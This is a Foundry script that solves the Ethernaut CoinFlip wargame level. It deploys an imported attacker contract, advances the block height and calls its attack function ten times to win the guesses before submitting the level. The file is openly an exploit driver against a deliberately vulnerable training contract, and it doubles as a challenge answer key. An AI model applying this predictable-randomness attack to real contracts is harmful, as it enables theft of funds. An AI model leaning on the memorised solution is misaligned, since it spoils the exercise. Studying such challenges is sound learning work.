// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {CoinFlipAttacker} from "../../src/03-CoinFlipAttacker.sol";

contract CoinFlipSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE 
        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(challengeInstance);
        uint256 height = 100;
        vm.roll(height);

        for (uint i = 0; i < 10; i++) {
            height += 1;
            vm.roll(height);
            coinFlipAttacker.attack();
        }

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(3));
    }
}
